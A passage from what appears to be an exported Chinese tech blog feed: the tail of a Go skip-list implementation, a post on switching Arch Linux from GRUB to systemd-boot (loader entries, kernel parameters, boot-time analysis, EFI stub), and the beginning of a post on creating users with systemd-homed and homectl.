class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> skiplist</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sk *Skiplist)</span></span> Search(target <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">  _, ok := search(sk.root, target)</span><br><span class="line">  <span class="keyword">return</span> ok</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(root *Node, target <span class="type">int</span>)</span></span> (node *Node, ok <span class="type">bool</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> i := <span class="built_in">len</span>(root.Next) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">    <span class="keyword">var</span> head = root.Next[i]</span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> || head.Val &gt; target &#123;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> head.Val == target &#123;</span><br><span class="line">      node, ok = head, <span class="literal">true</span></span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> head.Val &lt; target &#123; <span class="comment">// 小于则向下</span></span><br><span class="line">      root = head</span><br><span class="line">      i = <span class="built_in">len</span>(root.Next)</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sk *Skiplist)</span></span> Add(num <span class="type">int</span>) &#123;</span><br><span class="line">  level := randomLevel() <span class="comment">// 随机选择level</span></span><br><span class="line">  node := Node&#123;</span><br><span class="line">    Val:  num,</span><br><span class="line">    Prev: <span class="built_in">make</span>([]*Node, level),</span><br><span class="line">    Next: <span class="built_in">make</span>([]*Node, level),</span><br><span class="line">  &#125;</span><br><span class="line">  add(sk.root, &amp;node)</span><br><span class="line">  <span class="keyword">if</span> level &gt; sk.currentLevel &#123;</span><br><span class="line">    <span class="keyword">for</span> i := sk.currentLevel; i &lt; level; i++ &#123;</span><br><span class="line">      sk.root.Next = <span class="built_in">append</span>(sk.root.Next, &amp;node)</span><br><span class="line">      node.Prev[i] = sk.root</span><br><span class="line">    &#125;</span><br><span class="line">    sk.currentLevel = level</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">(root *Node, node *Node)</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> i := <span class="built_in">len</span>(root.Next) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">    <span class="keyword">var</span> head = root.Next[i]</span><br><span class="line">    <span class="keyword">if</span> head == <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(node.Next) &#123;</span><br><span class="line">        root.Next[i] = node</span><br><span class="line">        node.Prev[i] = root</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> head.Val &gt;= node.Val &#123;</span><br><span class="line">      <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(node.Next) &#123;</span><br><span class="line">        root.Next[i] = node</span><br><span class="line">        node.Next[i] = head</span><br><span class="line">        node.Prev[i] = root</span><br><span class="line">        node.Next[i].Prev[i] = node</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> head.Val &lt; node.Val &#123;</span><br><span class="line">      root = head</span><br><span class="line">      i = <span class="built_in">len</span>(root.Next)</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除元素，然后直接</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sk *Skiplist)</span></span> Erase(num <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">  node, ok := search(sk.root, num)</span><br><span class="line">  <span class="keyword">if</span> !ok &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(node.Next); i++ &#123;</span><br><span class="line">    node.Prev[i].Next[i] = node.Next[i]</span><br><span class="line">    <span class="keyword">if</span> node.Next[i] != <span class="literal">nil</span> &#123;</span><br><span class="line">      node.Next[i].Prev[i] = node.Prev[i]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a href="https://15721.courses.cs.cmu.edu/spring2018/papers/08-oltpindexes1/pugh-skiplists-cacm1990.pdf">Skip Lists: A Probabilistic Alternative to<br>Balanced Trees</a>  </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>skiplist</tag>
      </tags>
  </entry>
  <entry>
    <title>用systemd-boot做bootloader</title>
    <url>/systemd-boot/</url>
    <content><![CDATA[<p>又研究了一下linux的启动流程，然后换成systemd-boot了。原先好看的grub主题就不要了，但是systemd-boot它启动快啊，grub好臃肿</p>
<span id="more"></span>

<h2 id="从Grub迁移到systemd-boot"><a href="#从Grub迁移到systemd-boot" class="headerlink" title="从Grub迁移到systemd-boot"></a>从Grub迁移到systemd-boot</h2><p>grub有好看的主题，也能方便的在开机的时候选内核版本、进btrfs的sanpshot回滚。但是我想尝试一下systemd-boot，grub看起来实在是太复杂了，我用不到那些功能。systemd-boot已经在systemd全家桶里面了，所以不需要额外安装。</p>
<p>systemd-boot一般要放在第一个EFI分区，而且直到今天systemd-boot和btrfs配合的还不是很好。我建了一个512M的EFI分区, 格式化为FAT32</p>
<p>注意需要EFI分区(EFI system partition, ef00)，不能是Linux filesystem(8300), 分区的Type如果是这样，grub是可以的，但是systemd-boot不认。用cgdisk重新分区的时候Type选ef00</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> bootctl --path=/boot install</span><br><span class="line">File system <span class="string">&quot;/dev/block/259:1&quot;</span> has wrong <span class="built_in">type</span> <span class="keyword">for</span> an EFI System Partition (ESP).</span><br></pre></td></tr></table></figure>

<p>然后安装hook让每次更新内核的时候自动配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S systemd-boot-pacman-hook</span><br></pre></td></tr></table></figure>

<p>systemd-boot是单文件启动的，配置文件放在<code>/boot/loader/entries</code>下面，可以根据不同的启动选项创建不同的配置文件，比如按照Arch Wiki的推荐创建一个<code>arch.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title Arch</span><br><span class="line">linux /vmlinuz-linux</span><br><span class="line">initrd /amd-ucode.img</span><br><span class="line">initrd /initramfs-linux.img</span><br><span class="line">options root=LABEL=ROOT rootflags=subvol=@ rw</span><br></pre></td></tr></table></figure>

<p>title是名称，就是systemd-boot界面显示的那个。<br>linux选项是指定可执行的压缩内核，一般就<code>vmlinuz-linux</code>，如果是桌面用户装了其他内核应该能在<code>boot</code>目录下找到，比如<code>vmlinuz-linux-zen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/boot❯ <span class="built_in">ls</span></span><br><span class="line">amd-ucode.img                     initramfs-linux-lts.img              initramfs-linux-zen.img  vmlinuz-linux-lts</span><br><span class="line">EFI                               initramfs-linux-xanmod-fallback.img  initramfs-linux.img      vmlinuz-linux-xanmod</span><br><span class="line">initramfs-linux-fallback.img      initramfs-linux-xanmod.img           loader                   vmlinuz-linux-zen</span><br><span class="line">initramfs-linux-lts-fallback.img  initramfs-linux-zen-fallback.img     vmlinuz-linux </span><br></pre></td></tr></table></figure>

<p>然后用initrd选项指定一下想要的initramfs镜像，装了amd或者intel的微码也要指定一下</p>
<p>最后options里面指定一下根分区和内核参数（如果用btrfs还有rootflags指定一下是哪个subvol）</p>
<p>ps: 在写rootflags的时候我们可以直接照抄grub生成的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo grub-mkconfig 2&gt;/dev/null | grep vmlinuz</span><br></pre></td></tr></table></figure>

<p>然后我们配置一下loader.conf, 指定默认启动使用<code>arch.conf</code>的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default arch.conf</span><br><span class="line">timeout 4</span><br><span class="line">console-mode max</span><br><span class="line">editor vim</span><br></pre></td></tr></table></figure>

<p>现在boot目录的结构大概是这个样子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">❯ tree /boot</span><br><span class="line">/boot</span><br><span class="line">├── amd-ucode.img</span><br><span class="line">├── EFI</span><br><span class="line">│   ├── BOOT</span><br><span class="line">│   │   └── BOOTX64.EFI</span><br><span class="line">│   ├── Linux</span><br><span class="line">│   └── systemd</span><br><span class="line">│       └── systemd-bootx64.efi</span><br><span class="line">├── initramfs-linux-fallback.img</span><br><span class="line">├── initramfs-linux.img</span><br><span class="line">├── loader</span><br><span class="line">│   ├── entries</span><br><span class="line">│   │   └── arch.conf</span><br><span class="line">│   ├── loader.conf</span><br><span class="line">│   └── random-seed</span><br><span class="line">├── vmlinuz-linux</span><br></pre></td></tr></table></figure>

<p>然后我们可以把grub卸了</p>
<h3 id="使用Unified-Kernel-image"><a href="#使用Unified-Kernel-image" class="headerlink" title="使用Unified Kernel image"></a>使用Unified Kernel image</h3><p>就是把vmlinuz、ucode、initramfs的img都揉到一起做了一的大的可执行的内核镜像</p>
<h3 id="systemd-boot如何设置内核参数（参数是怎么传递的）"><a href="#systemd-boot如何设置内核参数（参数是怎么传递的）" class="headerlink" title="systemd-boot如何设置内核参数（参数是怎么传递的）"></a>systemd-boot如何设置内核参数（参数是怎么传递的）</h3><p>在options选项里面附加就可以了，然后systemd-boot会把参数传给initramfs，然后就是<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC92NC4xNC9hZG1pbi1ndWlkZS9rZXJuZWwtcGFyYW1ldGVycy5odG1s">kernel’s command-line parameters<i class="fa fa-external-link-alt"></i></span>那一套(能用<code>cat /proc/cmdline</code>看到的)，就是嵌入式uboot启动传参的那个tag链表。然后init的时候将参数传给systemd（既然你都用systemd-boot了那你的init系统肯定是systemd吧）</p>
<p>我以前看名字以为systemd直接就接管了，传给systemd之后就是熟悉的sysctl那一套<code>systemd-sysctl</code>。后来发现systemd-boot就是一个<code>bootctl</code>那种efi引导文件生成的一个工具（可以理解为一个bootloader差不多的东西），bootloader的界面那个时候就跟其他的bootloader差不多， 那个时候还没systemd什么事呢。</p>
<p>内核参数的传递大概是这样的：grub等bootloader的配置中配置了一些内核参数，然后grub在引导过程中将参数传给initramfs ，initramfs 先掛載一遍根，然後 initramfs 裡面的 init switch-root 到根裡面的 systemd ，然後 systemd 讀 fstab 生成 mount 文件，對根做 remount 。有些參數能在 remount 的時候改，比如 rw</p>
<h3 id="怎么指定启动时的kernel"><a href="#怎么指定启动时的kernel" class="headerlink" title="怎么指定启动时的kernel"></a>怎么指定启动时的kernel</h3><p>在systemd-boot的开机选择画面按e</p>
<h3 id="systemd-boot开机怎么进rootfs"><a href="#systemd-boot开机怎么进rootfs" class="headerlink" title="systemd-boot开机怎么进rootfs"></a>systemd-boot开机怎么进rootfs</h3><p>一开始用了比较扭曲的办法，后来发现这个只要在将UUID指定成boot分区的UUID就可以了</p>
<h3 id="systemd-boot开机怎么进bytfs-snapshot"><a href="#systemd-boot开机怎么进bytfs-snapshot" class="headerlink" title="systemd-boot开机怎么进bytfs snapshot"></a>systemd-boot开机怎么进bytfs snapshot</h3><p>这个貌似还真没啥好办法，要用这个还是装回grub吧。如果想开机进snapshot,需要手动将那个rootflag指定成snapshot所在的subvol。reddit上有一种方案是同时保留systemd-boot和grub, 然后在BIOS里面把systemd-boot的启动项放在前面，但是我不想要grub了。</p>
<blockquote>
<p>To use a subvolume as the root mountpoint specify the subvolume via a kernel parameter using rootflags&#x3D;subvol&#x3D;&#x2F;path&#x2F;to&#x2F;subvolume. Edit the root mountpoint in &#x2F;etc&#x2F;fstab and specify the mount option subvol&#x3D;. Alternatively the subvolume can be specified with its id, rootflags&#x3D;subvolid&#x3D;objectid as kernel parameter and subvolid&#x3D;objectid as mount option in &#x2F;etc&#x2F;fstab. It is preferable to mount using subvol&#x3D;&#x2F;path&#x2F;to&#x2F;subvolume, rather than the subvolid, as the subvolid may change when restoring #Snapshots, requiring a change of mount configuration, or else the system will not boot.</p>
</blockquote>
<p>如果要用systemd-boot进snapshot，需要改systemd-boot的配置文件指定rootflags。既然要手动改，不如直接用livecd进chroot操作更方便一点。需要手动改systemd-boot的参数不如grub那样装上<code>grub-btrfs</code>之后用上下键选择用哪个内核或者进入snapshot进行修复。</p>
<h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p>可以在systemctl命令中直接选择entry</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl reboot --boot-loader-entry=auto-windows</span><br></pre></td></tr></table></figure>

<h2 id="其他的一些操作"><a href="#其他的一些操作" class="headerlink" title="其他的一些操作"></a>其他的一些操作</h2><h3 id="如何加快启动速度"><a href="#如何加快启动速度" class="headerlink" title="如何加快启动速度"></a>如何加快启动速度</h3><p>换成systemd-boot已经很快了，不过如果你想再快，可以用<code>systemd-analyze</code>, 看一下是什么拖慢了你的启动速度</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$systemd</span>-analyze</span><br><span class="line">Startup finished <span class="keyword">in</span> 11.282s (firmware) + 4.842s (loader) + 3.317s (kernel) + 7.955s (userspace) = 27.398s</span><br><span class="line">graphical.target reached after 7.955s <span class="keyword">in</span> userspace</span><br></pre></td></tr></table></figure>

<p>如果想更详细的调查一下， <code>systemd-analyze blame</code>或者<code>systemd-analyze plot &gt; boot_process.svg</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$systemd</span>-analyze blame</span><br><span class="line">4.841s NetworkManager-wait-online.service</span><br><span class="line">2.429s systemd-udev-settle.service</span><br><span class="line">2.144s systemd-modules-load.service</span><br><span class="line"> 579ms systemd-binfmt.service</span><br><span class="line"> 496ms systemd-timesyncd.service</span><br><span class="line"> 320ms dev-nvme0n1p1.device</span><br><span class="line"> 223ms docker.service</span><br><span class="line"> 157ms systemd-journal-flush.service</span><br><span class="line"> 129ms systemd-remount-fs.service</span><br><span class="line">  93ms udisks2.service</span><br><span class="line">  84ms boot.mount</span><br><span class="line">  83ms user@1000.service</span><br><span class="line">  64ms libvirtd.service</span><br><span class="line">  63ms lvm2-monitor.service</span><br><span class="line">  38ms systemd-udev-trigger.service</span><br><span class="line">  37ms systemd-journald.service</span><br><span class="line">  36ms upower.service</span><br><span class="line">  33ms systemd-tmpfiles-setup.service</span><br><span class="line">  32ms systemd-udevd.service</span><br><span class="line">  30ms systemd-tmpfiles-clean.service</span><br><span class="line">  30ms systemd-logind.service</span><br></pre></td></tr></table></figure>

<p>可以看到是NetworkManger拖慢了我们的速度，然后发现是<code>systemd-networkd-wait-online.service</code>, 如果我们不需要这个直接禁用就好了</p>
<p>一般systemd-boot和systemd开机那一堆service和DM和DE（Desktop Environment）的加载相比不会拖慢你的速度的。不过我们其实可以连bootlaoder都不要的，如果是UEFI， 那直接EFI Stub就可以了</p>
<p>BIOS加载bootloader的启动文件（比如systemd-boot的systemd-bootx64.efi），bootloader再去引导内核启动</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">❯ tree EFI</span><br><span class="line">EFI</span><br><span class="line">├── BOOT</span><br><span class="line">│   └── BOOTX64.EFI</span><br><span class="line">├── Linux</span><br><span class="line">└── systemd</span><br><span class="line">    └── systemd-bootx64.efi</span><br></pre></td></tr></table></figure>

<p>其实我们可以直接用efibootmgr生成linux的efi启动文件，然后跳过booloader这个中间商。同样指定ucode和initramfs的img， 以及root所在的分区，然后会生成一个efi文件，直接引导进linux</p>
<h3 id="直接跑在内存上"><a href="#直接跑在内存上" class="headerlink" title="直接跑在内存上"></a>直接跑在内存上</h3><p>Archlinux可以直接用ramroot, 这个只要装个AUR包然后配置一下就可以了</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><h3 id="关于UEFI和BIOS"><a href="#关于UEFI和BIOS" class="headerlink" title="关于UEFI和BIOS"></a>关于UEFI和BIOS</h3><p>UEFI确切的说法是UEFI BIOS，其实也算作BIOS的一种，通常所说的BIOS指Legacy BIOS。这里按照通常习惯简称UEFI BIOS为UEFI, Legacy BIOS为BIOS。</p>
<h3 id="bootloader"><a href="#bootloader" class="headerlink" title="bootloader"></a>bootloader</h3><p>linux在很早的时候是不需要bootloader的，后来有了bootloader这种东西，不过你还是可以不要bootloader的，比如上面说到的EFI Stub。<br>systemd-boot也算是个bootloader，不过相比其他的booloader已经精简了很多了。</p>
<h3 id="关于initramfs和rootfs"><a href="#关于initramfs和rootfs" class="headerlink" title="关于initramfs和rootfs"></a>关于initramfs和rootfs</h3><p>看这里： <span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9maWxlc3lzdGVtcy9yYW1mcy1yb290ZnMtaW5pdHJhbWZzLnR4dA==">https://www.kernel.org/doc/Documentation/filesystems/ramfs-rootfs-initramfs.txt<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmdlbnRvby5vcmcvd2lraS9Jbml0cmFtZnMvR3VpZGUvemgtY24=">https://wiki.gentoo.org/wiki/Initramfs/Guide/zh-cn<i class="fa fa-external-link-alt"></i></span>  </p>
<h3 id="傻多戴的阴间BIOS固件"><a href="#傻多戴的阴间BIOS固件" class="headerlink" title="傻多戴的阴间BIOS固件"></a>傻多戴的阴间BIOS固件</h3><p>你戴的阴间BIOS固件，强制升级不能回退就算了，每次TM升级bug不修还锁CPU频率，次次更新BIOS反向升级，想淘汰老用户就直说呗。当年我想不要grub了整个EFI Stub玩，结果发现你戴的阴间BIOS怎么还是不行。。。</p>
<blockquote>
<p>EFISTUB does not work on some Dell systems<br>Several generation Dell firmwares are wrongly passing the arguments to the bootloader, thus making EFISTUB parse a null command line which normally means unbootable system (see the complete linux-efi thread).</p>
</blockquote>
<blockquote>
<p>A workaround has been found since Linux 5.10 to correct this behavior (see this commit ). For Linux &lt; 5.10, you can use an efi-packer like arch-efiboot, or a different bootloader.</p>
</blockquote>
<p>从13年到现在用过3台dell的笔记本了，一个比一个糟心，我再买dell的笔记本我是XX</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQXJjaF9ib290X3Byb2Nlc3NfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Arch boot process(简体中文)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjAzOTkuaHRt">浅析安全启动（Secure Boot）<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cDovLzUwbGluZXNvZmNvLmRlL3Bvc3QvMjAxOC0wMi0yOC13cml0aW5nLWFuLXg4Ni1oZWxsby13b3JsZC1ib290bG9hZGVyLXdpdGgtYXNzZW1ibHk=">Writing an x86 “Hello world” bootloader with assembly<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuanVubWFqaW5sb25nLmNvbS9saW51eC9zeXN0ZW1kL3N5c3RlbWRfYm9vdHVwLw==">systemd时代的开机启动流程(UEFI+systemd)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL2Jsb2cuY2hpbmF1bml4Lm5ldC91aWQtOTU0MzE3My1pZC0xOTg5MDA0Lmh0bWw=">Linux内核参数传递Tag(init_tags)<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0JPT1RfTE9BREVSX1NQRUNJRklDQVRJT04v">systemd The Boot Loader Specification<i class="fa fa-external-link-alt"></i></span>  官方文档  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvSW5pdF8oJUU3JUFFJTgwJUU0JUJEJTkzJUU0JUI4JUFEJUU2JTk2JTg3KQ==">init (简体中文)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQXJjaF9ib290X3Byb2Nlc3M=">https://wiki.archlinux.org/title/Arch_boot_process<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvU3lzdGVtZC1ib290">https://wiki.archlinux.org/title/Systemd-boot<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvRUZJX3N5c3RlbV9wYXJ0aXRpb24=">https://wiki.archlinux.org/title/EFI_system_partition<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvVW5pZmllZF9rZXJuZWxfaW1hZ2U=">https://wiki.archlinux.org/title/Unified_kernel_image<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvbWljcm9jb2Rl">https://wiki.archlinux.org/title/microcode<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvRUZJU1RVQg==">https://wiki.archlinux.org/title/EFISTUB<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yYW1zZGVuai5jb20vMjAxNi8wNC8xNS9tdWx0aS1ib290LWxpbnV4LXdpdGgtb25lLWJvb3QtcGFydGl0aW9uLmh0bWw=">Multi Boot Linux With One Boot Partition<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTGlzdF9vZl9MaW51eF9kaXN0cmlidXRpb25zX3RoYXRfcnVuX2Zyb21fUkFN">https://en.wikipedia.org/wiki/List_of_Linux_distributions_that_run_from_RAM<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FyY21hZ3MvcmFtcm9vdA==">https://github.com/arcmags/ramroot<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC92NC4xNC9hZG1pbi1ndWlkZS9rZXJuZWwtcGFyYW1ldGVycy5odG1s">https://www.kernel.org/doc/html/v4.14/admin-guide/kernel-parameters.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9lZmktc3R1Yi50eHQ=">https://www.kernel.org/doc/Documentation/efi-stub.txt<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>systemd-boot</tag>
        <tag>bootloader</tag>
      </tags>
  </entry>
  <entry>
    <title>systemd-homed简介(homectl设置用户、用户组)</title>
    <url>/systemd-homed/</url>
    <content><![CDATA[<p>在2020.3 发布的systemd 245增加了systemd-homed，改变了<code>/home</code>目录的加密和工作方式。用homectl设置用户组，直接加密整个<code>/home</code>目录更方便了，快来当小白鼠吧。</p>
<span id="more"></span>

<h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><h3 id="使用homectl新建用户、用户组"><a href="#使用homectl新建用户、用户组" class="headerlink" title="使用homectl新建用户、用户组"></a>使用homectl新建用户、用户组</h3><p>首先你的systemd要在245以后，版本较低或使用SysV或者OpenRC、Upstart的玩家请跳过。</p>
<p>更新：systemd-247以后的版本默认采用Btrfs，还加了一个可选的恢复密码（recovery key），你的密钥丢了可以用这个重置</p>
<p>homectl是systemd-homed.service的一个cli工具，用来配置用户组、用户，包括新建、删除、修改权限和密码等。考虑到systemd近乎一统江湖的的市场占有率，可能你们将不得不面对这种方式。</p>
<p>没开启的先开启一下<code>systemd-homed.service</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> systemd-homed</span><br><span class="line">systemctl start systemd-homed</span><br></pre></td></tr></table></figure>

<p>如果你的daemon没启动可能会出现<code>**Operation on home test1 failed: Failed to execute operation: Resource temporarily unavailable**</code></p>
<p>看到下面这样就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Created symlink /etc/systemd/system/dbus-org.freedesktop.home1.service → /usr/lib/systemd/system/systemd-homed.service.</span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/systemd-homed.service → /usr/lib/systemd/system/systemd-homed.service.</span><br><span class="line">Created symlink /etc/systemd/system/sockets.target.wants/systemd-userdbd.socket → /usr/lib/systemd/system/systemd-userdbd.socket.</span><br></pre></td></tr></table></figure>

<p>新建用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">homectl create zhixi</span><br></pre></td></tr></table></figure>

<p>会像下面这样提示你输入密码，输完之后要稍等一会</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@zjk-allseries zjk]<span class="comment"># homectl create zhixi</span></span><br><span class="line">🔐 Please enter new password <span class="keyword">for</span> user zhixi: ******                  </span><br><span class="line">🔐 Please enter new password <span class="keyword">for</span> user zhixi (repeat): (press TAB <span class="keyword">for</span> no <span class="built_in">echo</span>) </span><br></pre></td></tr></table></figure>

<p>创建成功之后使用<code>homectl list</code>查看homectl创建的用户是否存在</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@zjk-allseries zjk]<span class="comment"># homectl list</span></span><br><span class="line">NAME  UID   GID   STATE    REALNAME HOME        SHELL    </span><br><span class="line"><span class="built_in">test</span>  60444 60444 inactive <span class="built_in">test</span>     /home/test  /bin/bash</span><br><span class="line">test1 60510 60510 inactive test1    /home/test1 /bin/bash</span><br><span class="line">zhixi 60353 60353 inactive zhixi    /home/zhixi /bin/bash</span><br><span class="line"></span><br><span class="line">3 home areas listed.</span><br></pre></td></tr></table></figure>

<p><code>homectl inspect username</code>可以查看用户信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@zjk-allseries zhixi]# homectl inspect zhixi</span><br><span class="line">   User name: zhixi</span><br><span class="line">       State: active</span><br><span class="line"> Disposition: regular</span><br><span class="line"> Last Change: Sat 2020-10-31 17:05:25 CST</span><br><span class="line">    Login OK: yes</span><br><span class="line"> Password OK: yes</span><br><span class="line">         UID: 60353</span><br><span class="line">         GID: 60353 (zhixi)</span><br><span class="line">   Directory: /home/zhixi</span><br><span class="line">     Storage: luks (strong encryption)</span><br><span class="line">  Image Path: /home/zhixi.home</span><br><span class="line">   Removable: no</span><br><span class="line">       Shell: /bin/bash</span><br><span class="line">LUKS Discard: online=no offline=yes</span><br><span class="line">   LUKS UUID: 107ff22e399d417d92f398c91275de3b</span><br><span class="line">   Part UUID: 645499ec3e554eaca0f09a9b172d89b3</span><br><span class="line">     FS UUID: a6b5969ecfee4ae49f0cad9931f31589</span><br><span class="line"> File System: ext4</span><br><span class="line"> LUKS Cipher: aes</span><br><span class="line"> Cipher Mode: xts-plain64</span><br><span class="line">  Volume Key: 256bit</span><br><span class="line"> Mount Flags: nosuid nodev exec</span><br><span class="line">   Disk Size: 654.0G</span><br><span class="line">  Disk Usage: 11.3G (= 1.8%)</span><br><span class="line">   Disk Free: 642.7G (= 98.2%)</span><br><span class="line">  Disk Floor: 11.3G</span><br><span class="line">Disk Ceiling: 769.5G</span><br><span class="line">  Good Auth.: 1</span><br><span class="line">   Last Good: Sat 2020-10-31 19:23:25 CST</span><br><span class="line">   Bad Auth.: 1</span><br><span class="line">    Last Bad: Sat 2020-10-31 19:23:17 CST</span><br><span class="line">    Next Try: anytime</span><br><span class="line"> Auth. Limit: 30 attempts per 1min</span><br><span class="line">   Passwords: 1</span><br><span class="line">  Local Sig.: yes</span><br><span class="line">     Service: io.systemd.Home</span><br><span class="line">lines 2-36/36 (END)</span><br></pre></td></tr></table></figure>

<p>然后激活用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">homectl activate zhixi</span><br></pre></td></tr></table></figure>

<p>退出当前用户并切换用户就可以了(你可能需要更改PAM设置才能正常使用su切换用户)</p>
<h3 id="从原来的用户组管理方式迁往systemd-homed"><a href="#从原来的用户组管理方式迁往systemd-homed" class="headerlink" title="从原来的用户组管理方式迁往systemd-homed"></a>从原来的用户组管理方式迁往systemd-homed</h3><blockquote>
<p>这里直接复读一下systemd官网的警告，需要手动操作、有风险、做好备份、出了事自行承担</p>
</blockquote>
